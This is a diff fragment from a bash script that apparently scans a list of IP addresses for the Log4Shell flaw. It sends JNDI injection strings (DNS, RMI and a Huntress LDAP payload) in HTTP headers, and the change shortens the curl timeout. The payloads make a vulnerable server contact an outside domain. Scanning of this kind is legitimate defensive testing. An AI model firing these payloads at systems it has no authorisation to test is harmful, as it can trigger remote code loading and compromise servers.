@@ -65,11 +65,11 @@ while read -r IP
     do
         echo -e "\n[!] Targeting:$IP with $DOMAIN/$URI"
         echo -e "\n[+] Sending $IP DNS payload. Header: $EACH\n"
-        curl -I -X GET -m 2  http://$IP -H "$EACH: ${jndi:dns://$DOMAIN/$URI}"
+        curl -I -X GET -m 0.8  http://$IP -H "$EACH: ${jndi:dns://$DOMAIN/$URI}"
         echo -e "\n[+] Sending $IP RMI payload. Header: $EACH\n"
-        curl -I -X GET -m 2  http://$IP -H "$EACH: ${jndi:rmi://$DOMAIN/$URI}"
+        curl -I -X GET -m 0.8  http://$IP -H "$EACH: ${jndi:rmi://$DOMAIN/$URI}"
         echo -e "\n[+] Sending $IP  Huntress LDAP payload. Header: $EACH\n"
-        curl -I -X GET -m 2  http://$IP -H "$EACH: $HUNTRESS"
+        curl -I -X GET -m 0.8  http://$IP -H "$EACH: $HUNTRESS"
     done
     done < $NOSSL_FILE
 
